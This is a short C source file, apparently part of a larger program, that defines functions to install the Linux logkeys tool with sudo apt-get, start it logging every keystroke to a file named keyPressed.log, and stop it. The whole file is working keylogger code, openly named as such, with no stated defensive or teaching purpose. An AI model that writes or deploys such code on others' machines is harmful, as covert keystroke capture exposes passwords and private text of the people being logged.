#include <stdlib.h>

void keylogger_init(){
	system("sudo apt-get install logkeys");
}
void keylogger_start(){
	system("touch keyPressed.log");
	system("sudo logkeys --start --output keyPressed.log");
}

void keylogger_end(){
	system("sudo logkeys --kill");
}
